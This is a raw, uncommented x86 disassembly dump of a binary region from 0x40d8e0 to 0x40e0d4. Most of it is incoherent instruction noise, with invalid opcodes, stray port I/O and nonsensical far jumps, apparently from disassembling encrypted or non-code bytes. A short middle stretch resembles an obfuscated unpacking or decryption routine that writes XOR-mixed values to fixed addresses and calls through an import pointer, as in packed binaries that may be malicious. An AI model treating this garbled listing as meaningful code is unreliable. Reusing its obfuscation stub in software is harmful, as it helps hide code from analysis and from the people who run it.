  40d8e0:	loopne 0x40d8e4
  40d8e2:	xor    eax,0xad9f295e
  40d8e7:	retf   
  40d8e8:	aaa    
  40d8e9:	cli    
  40d8ea:	jge    0x40d8db
  40d8ec:	arpl   WORD PTR ds:0x177ab859,bx
  40d8f2:	mov    al,ds:0x3eb8c894
  40d8f7:	inc    ecx
  40d8f8:	test   DWORD PTR [ebp-0xc],ebp
  40d8fb:	(bad)  
  40d8fc:	call   0x275d8cc4
  40d901:	pop    eax
  40d902:	aas    
  40d903:	inc    ebx
  40d904:	jae    0x40d985
  40d906:	add    BYTE PTR [ebx+0x7613f53],bh
  40d90c:	ins    BYTE PTR es:[edi],dx
  40d90d:	add    al,0x11
  40d90f:	mov    ah,0x7c
  40d911:	xchg   ebx,eax
  40d912:	pop    es
  40d913:	push   ds
  40d914:	pop    ss
  40d915:	or     dl,bl
  40d917:	dec    edi
  40d918:	xchg   esi,eax
  40d919:	adc    al,0xab
  40d91b:	je     0x40d8eb
  40d91d:	and    dh,BYTE PTR [ecx-0x370724cf]
  40d923:	ins    BYTE PTR es:[edi],dx
  40d924:	xchg   esi,eax
  40d925:	pop    eax
  40d926:	xchg   BYTE PTR [esi+0x42],ch
  40d929:	or     eax,0xb34ae927
  40d92e:	adc    edi,DWORD PTR [edi]
  40d930:	mov    ds:0xf39b68fa,eax
  40d935:	push   0xfffffffa
  40d937:	mov    ds:0xcd821727,al
  40d93c:	push   ebp
  40d93d:	jge    0x40d92d
  40d93f:	leave  
  40d940:	scas   eax,DWORD PTR es:[edi]
  40d941:	inc    edx
  40d942:	push   ebx
  40d943:	cld    
  40d944:	sub    BYTE PTR [ecx-0x7b89a0b],cl
  40d94a:	(bad)  
  40d94b:	loopne 0x40d9b7
  40d94d:	jmp    0x40d9be
  40d94f:	xor    BYTE PTR ds:0xf27cdfae,0xfa
  40d956:	or     al,0x30
  40d958:	adc    eax,0x4a3396d6
  40d95d:	mov    ch,0x19
  40d95f:	in     al,dx
  40d960:	test   BYTE PTR [ebp+edi*8+0x7a],0x6e
  40d965:	out    0x83,al
  40d967:	loopne 0x40d981
  40d969:	add    bl,bl
  40d96b:	arpl   WORD PTR [esi+0x36e4f717],di
  40d971:	sub    eax,0x498bcb6c
  40d976:	repnz or eax,0x73a03835
  40d97c:	mov    ch,0xba
  40d97e:	and    eax,0xb2b80dff
  40d983:	xchg   ecx,esp
  40d985:	xor    edi,DWORD PTR [ebx+ecx*8+0x24]
  40d989:	mov    bh,0xca
  40d98b:	mov    edx,0x873673cd
  40d990:	stos   DWORD PTR es:[edi],eax
  40d991:	add    bl,BYTE PTR [esi]
  40d993:	sub    eax,0x3a51e1eb
  40d998:	pop    es
  40d999:	adc    eax,0x27ae5786
  40d99e:	bound  esp,QWORD PTR ss:[edx+0x77271049]
  40d9a5:	adc    eax,0x80e1c465
  40d9aa:	iret   
  40d9ab:	sar    BYTE PTR [ebx-0x1b],cl
  40d9ae:	sar    ch,1
  40d9b0:	adc    BYTE PTR [esi],al
  40d9b2:	inc    eax
  40d9b3:	mov    cl,0x73
  40d9b5:	inc    ecx
  40d9b6:	mov    ds:0x6acab11e,eax
  40d9bb:	push   cs
  40d9bc:	mov    al,ds:0xc3292a00
  40d9c1:	fisubr WORD PTR [edi-0x29e56623]
  40d9c7:	dec    ecx
  40d9c8:	scas   al,BYTE PTR es:[edi]
  40d9c9:	add    eax,0x588d0e01
  40d9ce:	pop    edx
  40d9cf:	add    al,0x84
  40d9d1:	hlt    
  40d9d2:	xor    BYTE PTR [ecx+edi*8+0x4e661062],ah
  40d9d9:	std    
  40d9da:	sbb    ebx,ebp
  40d9dc:	push   ecx
  40d9dd:	inc    ebx
  40d9de:	lds    esp,FWORD PTR [edi+0x51]
  40d9e1:	std    
  40d9e2:	adc    BYTE PTR [eax+0x351c1a84],0x9b
  40d9e9:	(bad)  
  40d9ea:	in     eax,0xe5
  40d9ec:	mov    ch,0xa0
  40d9ee:	mov    ah,0x7d
  40d9f0:	mov    cl,0xe5
  40d9f2:	cmc    
  40d9f3:	pop    ecx
  40d9f4:	or     dh,ah
  40d9f6:	pop    edi
  40d9f7:	inc    esi
  40d9f8:	sub    eax,0x1ffbce47
  40d9fd:	and    DWORD PTR [edx-0x13],ecx
  40da00:	cmp    al,BYTE PTR [eax-0x36]
  40da03:	in     al,dx
  40da04:	sar    BYTE PTR [ecx+0x32],cl
  40da07:	not    DWORD PTR ds:0xbe23ded9
  40da0d:	add    cl,BYTE PTR [edx-0x1d]
  40da10:	push   edi
  40da11:	sbb    esp,DWORD PTR [ebp+0x15e3f2b2]
  40da17:	or     dl,ch
  40da19:	mov    WORD PTR [edi+edi*2+0x2b],es
  40da1d:	cmp    dl,BYTE PTR [esp+eax*1-0x2c5a61cd]
  40da24:	scas   eax,DWORD PTR es:[edi]
  40da25:	and    cl,al
  40da27:	jns    0x40da11
  40da29:	mov    esi,0xe41d74e8
  40da2e:	sahf   
  40da2f:	cdq    
  40da30:	not    eax
  40da32:	(bad)  
  40da33:	cld    
  40da34:	add    DWORD PTR [eax+0x8888326],0x46
  40da3b:	cmp    ecx,0xffffff93
  40da3e:	mov    dh,0xd8
  40da40:	hlt    
  40da41:	retf   
  40da42:	sbb    eax,0x148bbfbb
  40da47:	inc    DWORD PTR [ecx+0xf0e0a74]
  40da4d:	sbb    al,0xcc
  40da4f:	adc    edx,DWORD PTR [ecx]
  40da51:	(bad)  
  40da52:	jge    0x40daa9
  40da54:	les    ebx,FWORD PTR [eax-0x1e]
  40da57:	dec    edi
  40da58:	mov    esi,0x4a898891
  40da5d:	mov    bl,0xd1
  40da5f:	ja     0x40da0b
  40da61:	jl     0x40da12
  40da63:	les    esi,FWORD PTR [ecx+0xd]
  40da66:	(bad)  
  40da67:	leave  
  40da68:	jno    0x40da74
  40da6a:	js     0x40da61
  40da6c:	mov    bl,0x3a
  40da6e:	loope  0x40da2b
  40da70:	adc    dh,dh
  40da72:	retf   
  40da73:	push   ecx
  40da74:	in     al,0x3b
  40da76:	pusha  
  40da77:	mov    bh,0x35
  40da79:	mov    edi,DWORD PTR [esi]
  40da7b:	sbb    BYTE PTR [eax-0x5f],0x83
  40da7f:	add    DWORD PTR [edi+ebp*4],esp
  40da82:	mov    ds:0x81875312,eax
  40da87:	fldcw  WORD PTR [edx+0x2e]
  40da8a:	push   es
  40da8b:	sub    eax,0xc8bb7e82
  40da90:	ss push ds
  40da92:	popf   
  40da93:	add    BYTE PTR [edx-0x7d38ca96],ah
  40da99:	sbb    al,0xa0
  40da9b:	pop    esp
  40da9c:	lods   al,BYTE PTR ds:[esi]
  40da9d:	push   ebp
  40da9e:	sub    ecx,esi
  40daa0:	dec    BYTE PTR ds:0x5ad6266d
  40daa6:	lea    ecx,[ebp+ebp*2+0x5fa44c8]
  40daad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40daae:	in     al,0x91
  40dab0:	xor    BYTE PTR [eax],cl
  40dab2:	in     eax,0x13
  40dab4:	cdq    
  40dab5:	jne    0x40da3d
  40dab7:	dec    ebx
  40dab8:	fstp   QWORD PTR [ebx]
  40daba:	daa    
  40dabb:	xlat   BYTE PTR ds:[ebx]
  40dabc:	xor    eax,DWORD PTR [ebx+ebp*4-0x701fabe7]
  40dac3:	jge    0x40dad5
  40dac5:	mov    ecx,0xf09cd48b
  40daca:	adc    al,0xf7
  40dacc:	addr16 repnz dec eax
  40dacf:	fwait
  40dad0:	aam    0xd5
  40dad2:	cmp    al,0x40
  40dad4:	in     al,0xe4
  40dad6:	inc    ebx
  40dad7:	and    esi,esi
  40dad9:	mov    edi,0x100eb93e
  40dade:	sub    al,0xa5
  40dae0:	nop
  40dae1:	pushf  
  40dae2:	sbb    eax,0x5244620f
  40dae7:	dec    ebp
  40dae8:	jg     0x40db3d
  40daea:	push   es
  40daeb:	fwait
  40daec:	pop    edx
  40daed:	imul   eax,DWORD PTR [ecx+0x77],0x89eb96ac
  40daf4:	dec    edi
  40daf5:	xor    dl,ch
  40daf7:	sub    dh,BYTE PTR [esp+ebp*2]
  40dafa:	sub    al,0x1e
  40dafc:	sub    eax,0xd446f0a9
  40db01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db02:	jno    0x40db0e
  40db04:	je     0x40db31
  40db06:	jb     0x40dac5
  40db08:	xor    eax,0xd905bad0
  40db0d:	outs   dx,DWORD PTR ds:[esi]
  40db0e:	xor    eax,0x50186430
  40db13:	jmp    0x40dac7
  40db15:	add    BYTE PTR [ecx-0x4f85ca21],bh
  40db1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db1c:	cs sbb edx,0xe505364c
  40db23:	pop    ebx
  40db24:	addr16 (bad) 
  40db26:	cwde   
  40db27:	jns    0x40dae1
  40db29:	mov    bl,0xae
  40db2b:	gs dec bp
  40db2e:	int3   
  40db2f:	dec    eax
  40db30:	or     bl,0xd4
  40db33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db34:	ret    
  40db35:	jl     0x40dac1
  40db37:	retf   
  40db38:	inc    edx
  40db39:	out    dx,eax
  40db3a:	push   esp
  40db3b:	in     eax,0x82
  40db3d:	fst    st(1)
  40db3f:	sbb    DWORD PTR [esi-0x35f8a122],esi
  40db45:	test   al,0x99
  40db47:	xor    BYTE PTR [ebp-0x4bea6f8d],0xf1
  40db4e:	icebp  
  40db4f:	pop    ecx
  40db50:	xor    eax,0x4084d090
  40db55:	pop    edx
  40db56:	or     BYTE PTR [edi],dl
  40db58:	popa   
  40db59:	adc    BYTE PTR [eax],dl
  40db5b:	mov    ds:0x76b083aa,eax
  40db60:	sahf   
  40db61:	shl    DWORD PTR [eax+0x34],1
  40db64:	mov    al,ds:0x9c0d6981
  40db69:	(bad)  
  40db6a:	test   eax,0x42003d82
  40db6f:	les    eax,FWORD PTR [eax]
  40db71:	pop    esp
  40db72:	popa   
  40db73:	inc    ecx
  40db74:	sbb    eax,0xf49236a5
  40db79:	push   ss
  40db7a:	das    
  40db7b:	out    0xba,al
  40db7d:	push   es
  40db7e:	pop    ss
  40db7f:	inc    edx
  40db80:	lds    esp,FWORD PTR [eax-0x3efe595e]
  40db86:	lss    edx,FWORD PTR [edi]
  40db89:	mov    BYTE PTR [edi],bh
  40db8b:	enter  0xbd6a,0xba
  40db8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db90:	mov    ebp,DWORD PTR [eax+0x7423a712]
  40db96:	jnp    0x40dbd7
  40db98:	gs out dx,al
  40db9a:	mov    ebp,0xede213af
  40db9f:	add    esi,ebx
  40dba1:	sub    eax,0x7a07fe46
  40dba6:	(bad)  
  40dba7:	out    dx,eax
  40dba8:	push   eax
  40dba9:	sub    ah,BYTE PTR [edx-0x4e989229]
  40dbaf:	add    al,BYTE PTR [eax+ebx*1+0xd]
  40dbb3:	add    eax,0x631ff2cc
  40dbb8:	imul   ebx,esp,0xffffffe8
  40dbbb:	jmp    0x3c5f:0x13845370
  40dbc2:	dec    eax
  40dbc3:	test   BYTE PTR [esi+ebx*2-0x16],bh
  40dbc7:	push   0x969de88f
  40dbcc:	icebp  
  40dbcd:	adc    BYTE PTR [ebp-0x59482276],bl
  40dbd3:	and    BYTE PTR [edi],dh
  40dbd5:	shl    BYTE PTR [ebx],1
  40dbd7:	inc    ecx
  40dbd8:	sbb    eax,0x31e63399
  40dbdd:	mov    ebp,0x6b3fb973
  40dbe2:	loopne 0x40dc3e
  40dbe4:	cmp    DWORD PTR [ecx],edi
  40dbe6:	fwait
  40dbe7:	cmp    eax,0x6f564b29
  40dbec:	ss xor al,0x97
  40dbef:	pop    fs
  40dbf1:	mov    edi,0x942a048c
  40dbf6:	scas   al,BYTE PTR es:[edi]
  40dbf7:	adc    esi,edi
  40dbf9:	cmp    ah,BYTE PTR [ebx]
  40dbfb:	sub    DWORD PTR [edi-0x21],ebx
  40dbfe:	pop    ds
  40dbff:	icebp  
  40dc00:	jle    0x40dc44
  40dc02:	addr16 fs mov esi,0x4b2cbffd
  40dc09:	out    0x92,al
  40dc0b:	jmp    0x40dbec
  40dc0d:	call   0xfe49:0x81e3a575
  40dc14:	adc    esi,DWORD PTR [ebx]
  40dc16:	dec    ebx
  40dc17:	mov    al,0x3a
  40dc19:	cmp    al,0xdf
  40dc1b:	dec    esi
  40dc1c:	repnz in eax,0xe3
  40dc1f:	ficomp DWORD PTR [esi+0x7a]
  40dc22:	jae    0x40dbbf
  40dc24:	aaa    
  40dc25:	mov    eax,ds:0x7ccb8ff
  40dc2a:	and    esp,DWORD PTR [edi+0x43846c5b]
  40dc30:	in     eax,0xfb
  40dc32:	jns    0x40dc18
  40dc34:	ss mov esi,0xdbe5629
  40dc3a:	bound  ebx,QWORD PTR [ecx-0x28c25a04]
  40dc40:	sub    al,0xf3
  40dc42:	add    al,0xe7
  40dc44:	push   eax
  40dc45:	cld    
  40dc46:	push   eax
  40dc47:	jl     0x40dc14
  40dc49:	adc    BYTE PTR [ebx],cl
  40dc4b:	jl     0x40dbed
  40dc4d:	mov    esi,0xfef95352
  40dc52:	dec    edi
  40dc53:	dec    eax
  40dc54:	mov    esp,0x1504fae3
  40dc59:	push   edi
  40dc5a:	jmp    0xc635:0x44786fd
  40dc61:	lahf   
  40dc62:	ret    0xdacb
  40dc65:	cmp    bh,al
  40dc67:	je     0x40dc35
  40dc69:	dec    ecx
  40dc6a:	or     DWORD PTR [edi+0x12],0x8a78702c
  40dc71:	mov    eax,0x9dc9e457
  40dc76:	retf   
  40dc77:	leave  
  40dc78:	inc    edi
  40dc79:	push   ebx
  40dc7a:	and    ebx,0xffffffe5
  40dc7d:	xchg   edi,eax
  40dc7e:	stc    
  40dc7f:	hlt    
  40dc80:	lock or ebx,esp
  40dc83:	dec    edx
  40dc84:	or     DWORD PTR fs:[ebx-0x19],esp
  40dc88:	sub    DWORD PTR [esi+ebx*1+0x6892949d],0xc6c59cfa
  40dc93:	mov    edi,0x59224599
  40dc98:	test   edx,0x49609d3e
  40dc9e:	dec    ebp
  40dc9f:	mov    ebp,0x87d914cf
  40dca4:	inc    edi
  40dca5:	pop    ds
  40dca6:	(bad)  
  40dca8:	sbb    BYTE PTR [eax+esi*4-0x631d109d],al
  40dcaf:	call   0x5d3d:0xf246f499
  40dcb6:	push   eax
  40dcb7:	mov    ebx,0x7a0b6ef8
  40dcbc:	fbld   TBYTE PTR [edi]
  40dcbe:	xchg   DWORD PTR [edx-0x25],esp
  40dcc1:	(bad)  
  40dcc2:	xor    al,0x33
  40dcc4:	jns    0x40dcb8
  40dcc6:	or     al,0xe2
  40dcc8:	gs in  al,dx
  40dcca:	lds    edi,FWORD PTR [ebx-0x7c97608c]
  40dcd0:	sti    
  40dcd1:	fstp   QWORD PTR [edi]
  40dcd3:	sub    eax,0x33f4e422
  40dcd8:	xor    dl,BYTE PTR [ebp+0x495412bb]
  40dcde:	sahf   
  40dcdf:	dec    ebx
  40dce0:	sub    edx,edx
  40dce2:	jg     0x40dcfb
  40dce4:	je     0x40dd36
  40dce6:	mov    bl,0x0
  40dce8:	sub    al,0x81
  40dcea:	outs   dx,BYTE PTR ds:[esi]
  40dceb:	xchg   edi,eax
  40dcec:	call   0x793b2d0b
  40dcf1:	dec    edx
  40dcf2:	pop    esp
  40dcf3:	mov    edi,0xd7667d91
  40dcf8:	ret    
  40dcf9:	cmp    eax,0xffd0faf
  40dcfe:	mov    cl,0x86
  40dd00:	cdq    
  40dd01:	inc    edi
  40dd02:	ret    0x23c2
  40dd05:	adc    BYTE PTR ds:0x8864654d,dh
  40dd0b:	call   0xe4ce:0x824d4463
  40dd12:	sub    BYTE PTR [ecx-0x2c],ah
  40dd15:	adc    BYTE PTR [edi+0x4bd40366],ch
  40dd1b:	scas   eax,DWORD PTR es:[edi]
  40dd1c:	pop    esp
  40dd1d:	push   edi
  40dd1e:	push   es
  40dd1f:	fdivr  DWORD PTR [esi]
  40dd21:	or     al,0x1e
  40dd23:	pop    edi
  40dd24:	lods   eax,DWORD PTR ds:[esi]
  40dd25:	scas   al,BYTE PTR es:[edi]
  40dd26:	xchg   ecx,eax
  40dd27:	mov    cl,dh
  40dd29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd2a:	not    edx
  40dd2c:	sti    
  40dd2d:	pop    ebp
  40dd2e:	sbb    al,0xb5
  40dd30:	shl    DWORD PTR [ebx+ecx*1-0x25],cl
  40dd34:	lahf   
  40dd35:	imul   esp,DWORD PTR [eax],0x11bd119
  40dd3b:	pop    ebp
  40dd3c:	pop    esi
  40dd3d:	mov    cl,0x27
  40dd3f:	mov    dh,0xea
  40dd41:	push   edx
  40dd42:	xchg   edi,eax
  40dd43:	sub    BYTE PTR [ebp+0x39],dh
  40dd46:	aam    0xd2
  40dd48:	jecxz  0x40ddab
  40dd4a:	add    DWORD PTR [ebp+0x6b],esp
  40dd4d:	sub    eax,DWORD PTR [ebx-0x57]
  40dd50:	repnz mov dl,0x0
  40dd53:	in     al,dx
  40dd54:	mov    ebx,0x7a618a18
  40dd59:	loopne 0x40ddca
  40dd5b:	int    0x89
  40dd5d:	xor    bh,BYTE PTR [edx-0x50]
  40dd60:	setg   BYTE PTR [ecx]
  40dd63:	jmp    0x3784:0x4ab0bfe3
  40dd6a:	das    
  40dd6b:	leave  
  40dd6c:	ss ret 
  40dd6e:	aaa    
  40dd6f:	jp     0x40dd99
  40dd71:	stc    
  40dd72:	inc    ebx
  40dd73:	xchg   edi,eax
  40dd74:	push   edi
  40dd75:	cdq    
  40dd76:	cmp    al,0x6b
  40dd78:	jo     0x40dd9d
  40dd7a:	ror    BYTE PTR [ecx+0x52e5ec0b],0xcc
  40dd81:	pop    ss
  40dd82:	ins    DWORD PTR es:[edi],dx
  40dd83:	mov    cl,0x8b
  40dd85:	mov    ds:0xc66e56ac,eax
  40dd8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd8b:	push   es
  40dd8c:	arpl   WORD PTR [edi+0xf],sp
  40dd8f:	fld    QWORD PTR [ebx-0x4a]
  40dd92:	add    BYTE PTR [eax+edx*1],ah
  40dd95:	and    eax,0x548292c4
  40dd9b:	push   edx
  40dd9c:	sub    DWORD PTR [edx],0xffffffc1
  40dd9f:	sahf   
  40dda0:	data16 je 0x40de08
  40dda3:	frstor [ebx-0x6ff0fc9f]
  40dda9:	arpl   WORD PTR [eax-0x4a4a4b73],bx
  40ddaf:	hlt    
  40ddb0:	sbb    BYTE PTR [eax],bl
  40ddb2:	mov    eax,0xc8f21633
  40ddb7:	sahf   
  40ddb8:	and    eax,DWORD PTR ds:0x1ec24a1a
  40ddbe:	loope  0x40dd79
  40ddc0:	es fmulp st(7),st
  40ddc3:	add    BYTE PTR [eax],al
  40ddc5:	and    al,0x75
  40ddc7:	mov    cl,BYTE PTR [eax-0x2b]
  40ddca:	mov    ebp,0xa924361c
  40ddcf:	in     al,0x1b
  40ddd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddd2:	pop    esp
  40ddd3:	call   0x726b4d20
  40ddd8:	idiv   ecx
  40ddda:	sbb    esi,ebp
  40dddc:	or     BYTE PTR [ecx-0x5d],bl
  40dddf:	jl     0x40de2f
  40dde1:	gs ret 0xd51c
  40dde5:	dec    esp
  40dde6:	arpl   WORD PTR [edi],si
  40dde8:	or     DWORD PTR [ebp-0x42],ebp
  40ddeb:	xchg   BYTE PTR [ecx+eax*1+0x1d62ba27],dl
  40ddf2:	xor    al,0x4e
  40ddf4:	push   cs
  40ddf5:	mov    al,0xf
  40ddf7:	lds    ebx,FWORD PTR [ecx-0x2b15348c]
  40ddfd:	fisub  DWORD PTR [edi+0x70]
  40de00:	push   es
  40de01:	cdq    
  40de02:	push   es
  40de03:	add    DWORD PTR [edx],esi
  40de05:	mov    ecx,0x4148ad20
  40de0a:	mov    bh,BYTE PTR [ecx-0x2957361b]
  40de10:	(bad)  
  40de11:	stos   DWORD PTR es:[edi],eax
  40de12:	repz sbb esi,DWORD PTR ds:0xa616f67e
  40de19:	push   ds
  40de1a:	push   0x79
  40de1c:	out    0x24,eax
  40de1e:	or     edi,DWORD PTR [ebx]
  40de20:	inc    ecx
  40de21:	mov    ah,0x10
  40de23:	lahf   
  40de24:	stc    
  40de25:	pop    edx
  40de26:	(bad)  
  40de27:	jecxz  0x40de11
  40de29:	(bad)  
  40de2a:	fist   DWORD PTR [ecx-0x2d128b18]
  40de30:	fwait
  40de31:	jbe    0x40de64
  40de33:	jo     0x40ddd6
  40de35:	jb     0x40de1f
  40de37:	rcr    BYTE PTR [edi],0x6a
  40de3a:	shl    al,0x56
  40de3d:	test   edx,esi
  40de3f:	aad    0x6a
  40de41:	das    
  40de42:	test   BYTE PTR [edi],ah
  40de44:	jp     0x40debd
  40de46:	addr16 cli 
  40de48:	mov    ds:0xc0852898,al
  40de4d:	(bad)  
  40de4e:	fidivr WORD PTR [ebp-0x75]
  40de51:	inc    ebp
  40de52:	cld    
  40de53:	push   ebx
  40de54:	mov    DWORD PTR ds:0x42500c,0x32d4
  40de5e:	je     0x40deb5
  40de64:	or     DWORD PTR ds:0x427000,ecx
  40de6a:	mov    esi,DWORD PTR [ebp-0x18]
  40de6d:	mov    DWORD PTR ds:0x429000,0x1a4f
  40de77:	add    DWORD PTR [eax],esi
  40de79:	mov    eax,DWORD PTR [ebp-0x4]
  40de7c:	xor    esi,esi
  40de7e:	or     esi,DWORD PTR ds:0x428010
  40de84:	or     DWORD PTR ds:0x42600c,esi
  40de8a:	mov    esi,DWORD PTR [ebp+0xc]
  40de8d:	dec    DWORD PTR ds:0x428014
  40de93:	xor    esi,ecx
  40de95:	add    esi,edx
  40de97:	sub    DWORD PTR ds:0x426014,0x425028
  40dea1:	imul   esi,DWORD PTR [eax]
  40dea4:	mov    DWORD PTR ds:0x42701c,0x7c46
  40deae:	mov    DWORD PTR [eax],esi
  40deb0:	jmp    0x40dec4
  40deb5:	sub    DWORD PTR ds:0x427010,0x59d5
  40debf:	mov    esi,DWORD PTR [ebp+0x14]
  40dec2:	xor    DWORD PTR [eax],esi
  40dec4:	sub    esi,edi
  40dec6:	mov    eax,DWORD PTR [ebp-0x4]
  40dec9:	and    DWORD PTR ds:0x42801c,0x11ac
  40ded3:	mov    edi,DWORD PTR [ebp+0x10]
  40ded6:	add    ebx,esi
  40ded8:	xor    edi,ecx
  40deda:	or     DWORD PTR ds:0x429010,ebx
  40dee0:	mov    esi,0xffcd8d25
  40dee5:	dec    DWORD PTR ds:0x42801c
  40deeb:	mov    ebx,esi
  40deed:	sub    ebx,edi
  40deef:	add    DWORD PTR [eax],ebx
  40def1:	mov    DWORD PTR ds:0x425020,0x1c
  40defb:	cmp    DWORD PTR ds:0x425020,0x0
  40df02:	je     0x40df56
  40df08:	cmp    DWORD PTR ds:0x425020,0x9
  40df0f:	jne    0x40df28
  40df15:	push   DWORD PTR [ebp-0x28]
  40df18:	push   0x8d04
  40df1d:	push   0x4e0d
  40df22:	call   DWORD PTR ds:0x421020
  40df28:	cmp    DWORD PTR ds:0x425020,0xa
  40df2f:	jne    0x40df42
  40df35:	mov    edi,DWORD PTR ds:0x425020
  40df3b:	dec    edi
  40df3c:	mov    DWORD PTR ds:0x425020,edi
  40df42:	xor    edi,edi
  40df44:	xor    edi,DWORD PTR ds:0x425020
  40df4a:	dec    edi
  40df4b:	mov    DWORD PTR ds:0x425020,edi
  40df51:	jmp    0x40defb
  40df56:	mov    eax,DWORD PTR [ebp-0x4]
  40df59:	mov    edi,DWORD PTR [ebp-0x8]
  40df5c:	add    edi,DWORD PTR [eax]
  40df5e:	mov    DWORD PTR [ebp-0x8],edi
  40df61:	mov    eax,DWORD PTR [ebp+0xc]
  40df64:	mov    edi,DWORD PTR [ebp+0xc]
  40df67:	xor    edi,ecx
  40df69:	xor    eax,ecx
  40df6b:	lea    eax,[eax+edi*1+0x64e5b6]
  40df72:	mov    edi,DWORD PTR [ebp+0xc]
  40df75:	xor    edi,ecx
  40df77:	add    edi,edx
  40df79:	imul   eax,edi
  40df7c:	mov    edi,DWORD PTR [ebp+0xc]
  40df7f:	xor    edi,ecx
  40df81:	sub    edi,eax
  40df83:	mov    eax,DWORD PTR [ebp-0x4]
  40df86:	add    edi,edx
  40df88:	cmp    DWORD PTR [eax],edi
  40df8a:	mov    eax,DWORD PTR [ebp-0x4]
  40df8d:	mov    edi,DWORD PTR [ebp+0x10]
  40df90:	jg     0x40dfa3
  40df96:	xor    edi,ecx
  40df98:	mov    ebx,esi
  40df9a:	sub    ebx,edi
  40df9c:	add    DWORD PTR [eax],ebx
  40df9e:	jmp    0x40dfa9
  40dfa3:	xor    edi,ecx
  40dfa5:	add    edi,edx
  40dfa7:	add    DWORD PTR [eax],edi
  40dfa9:	mov    eax,DWORD PTR [ebp-0x8]
  40dfac:	mov    edi,DWORD PTR [ebp-0x10]
  40dfaf:	mov    eax,DWORD PTR [eax]
  40dfb1:	xor    edi,ecx
  40dfb3:	add    edi,0x3272da
  40dfb9:	not    edi
  40dfbb:	and    eax,edi
  40dfbd:	movsx  di,BYTE PTR [eax+0x1]
  40dfc2:	jmp    0x41036d
  40dfc7:	jge    0x40e029
  40dfc9:	xor    al,0x4e
  40dfcb:	xor    eax,DWORD PTR [esi]
  40dfcd:	add    ecx,DWORD PTR [edi-0x5e]
  40dfd0:	mov    dl,0x21
  40dfd2:	mov    al,0x11
  40dfd4:	jae    0x40dffe
  40dfd6:	mov    esp,0x6262d2c5
  40dfdb:	hlt    
  40dfdc:	pop    edi
  40dfdd:	bound  esp,QWORD PTR [edx-0x4a]
  40dfe0:	mov    BYTE PTR [edx+0xa30b08d],0x5c
  40dfe7:	sub    eax,0xc3c2f7af
  40dfec:	pop    edi
  40dfed:	push   0x70
  40dfef:	test   ecx,eax
  40dff1:	and    ebp,eax
  40dff3:	cmp    eax,0xff169783
  40dff8:	sbb    DWORD PTR [ecx-0x7f269dca],ebp
  40dffe:	xchg   esi,eax
  40dfff:	js     0x40dff1
  40e001:	imul   edi,DWORD PTR [ebx],0x1
  40e004:	mov    ch,0x10
  40e006:	dec    ecx
  40e007:	or     edx,ebx
  40e009:	jle    0x40e05d
  40e00b:	out    0xf3,eax
  40e00d:	(bad)  [ebp-0x6636182c]
  40e013:	sub    ch,BYTE PTR [edx+0x5e]
  40e016:	ds push edx
  40e018:	enter  0x9eb1,0x2e
  40e01c:	sti    
  40e01d:	shl    cl,1
  40e01f:	and    dh,bl
  40e021:	(bad)
  40e025:	dec    ecx
  40e026:	add    ch,ah
  40e028:	nop
  40e029:	scas   eax,DWORD PTR es:[edi]
  40e02a:	add    cl,BYTE PTR [ecx-0x1a]
  40e02d:	fadd   QWORD PTR [edx+edx*2+0x6e]
  40e031:	mov    esi,0xc6d895b1
  40e036:	push   esi
  40e037:	or     BYTE PTR [ecx],0xad
  40e03a:	xor    BYTE PTR ds:0x55e4ded9,0x64
  40e041:	jnp    0x40e081
  40e043:	daa    
  40e044:	leave  
  40e045:	scas   eax,DWORD PTR es:[edi]
  40e046:	fcomi  st,st(0)
  40e048:	sbb    al,0xa8
  40e04a:	push   es
  40e04b:	mov    bh,0x82
  40e04d:	xchg   esp,eax
  40e04e:	fbld   TBYTE PTR [eax]
  40e050:	pop    ds
  40e051:	cli    
  40e052:	ffree  st(0)
  40e054:	aas    
  40e055:	in     al,dx
  40e056:	pop    ebx
  40e057:	mov    cl,0xfc
  40e059:	mov    edi,0x4c97e7f5
  40e05e:	dec    ecx
  40e05f:	mov    al,0xcb
  40e061:	popa   
  40e062:	dec    esi
  40e063:	jle    0x40e04a
  40e065:	fisubr WORD PTR [edi]
  40e067:	out    dx,eax
  40e068:	adc    eax,0xa4b1ccc8
  40e06d:	loopne 0x40e021
  40e06f:	xchg   BYTE PTR [edi+ecx*1-0x3c],cl
  40e073:	fsubr  DWORD PTR [edi+0x75]
  40e076:	pop    ds
  40e077:	cmp    eax,0xc02d47cb
  40e07c:	mov    esp,DWORD PTR [edx+ecx*1-0x7f]
  40e080:	sti    
  40e081:	js     0x40e038
  40e083:	xacquire xchg DWORD PTR [ecx+0x25],ecx
  40e087:	mov    esi,DWORD PTR [ecx+esi*2]
  40e08a:	stc    
  40e08b:	pop    ebp
  40e08c:	xlat   BYTE PTR ds:[ebx]
  40e08d:	aad    0xb6
  40e08f:	jo     0x40e063
  40e091:	(bad)  
  40e093:	dec    eax
  40e094:	iret   
  40e095:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e096:	dec    edx
  40e097:	xor    DWORD PTR [ecx+0x1c33bbcc],0x46
  40e09e:	ds fwait
  40e0a0:	dec    ebx
  40e0a1:	sahf   
  40e0a2:	inc    esp
  40e0a3:	xchg   esp,eax
  40e0a4:	adc    DWORD PTR [edx+0x46276d1f],0x5cfeecbd
  40e0ae:	cmp    eax,0xe5931ecd
  40e0b3:	outs   dx,DWORD PTR ds:[esi]
  40e0b4:	dec    eax
  40e0b5:	scas   eax,DWORD PTR es:[edi]
  40e0b6:	pop    ebx
  40e0b7:	scas   eax,DWORD PTR es:[edi]
  40e0b8:	iret   
  40e0b9:	dec    edx
  40e0ba:	jne    0x40e07b
  40e0bc:	pop    ds
  40e0bd:	adc    ebx,esi
  40e0bf:	inc    edx
  40e0c0:	stos   DWORD PTR es:[edi],eax
  40e0c1:	dec    esi
  40e0c2:	shl    BYTE PTR [ecx+0xfd4b9a5],1
  40e0c8:	pop    edx
  40e0c9:	pop    es
  40e0ca:	(bad)  
  40e0cb:	push   eax
  40e0cc:	gs scas al,BYTE PTR es:[edi]
  40e0ce:	out    0x83,al
  40e0d0:	add    DWORD PTR [ecx-0x59],ebp
  40e0d3:	cmc    
  40e0d4:	sub    ebx,edx
